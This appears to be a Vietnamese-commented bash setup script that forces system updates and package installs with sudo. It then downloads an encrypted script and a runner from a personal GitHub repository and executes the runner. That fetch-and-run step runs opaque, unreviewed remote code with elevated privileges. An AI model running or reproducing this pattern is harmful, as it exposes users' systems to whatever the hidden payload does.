#!/bin/bash

# Đặt môi trường không tương tác
export DEBIAN_FRONTEND=noninteractive

# Bước 1: Cập nhật hệ thống
echo "Đang cập nhật hệ thống..."
yes | sudo apt update && \
yes | sudo apt install -y jq && \
snap install jq && \
yes | sudo apt full-upgrade -y && \
echo "N" | sudo apt install sudo -y && \
yes | sudo apt install curl -y && \
echo "N" | sudo apt install iptables -y

# Bước 2: Tải hai file từ GitHub
echo "Đang tải file từ GitHub..."
wget https://raw.githubusercontent.com/AnhTuanIPV62025/vip6789/main/dockaka.sh.enc
wget https://raw.githubusercontent.com/AnhTuanIPV62025/vip6789/main/dockaka_runner.sh

# Bước 3: Cấp quyền thực thi cho dockaka_runner.sh
chmod +x dockaka_runner.sh

# Bước 4: Chạy script
./dockaka_runner.sh
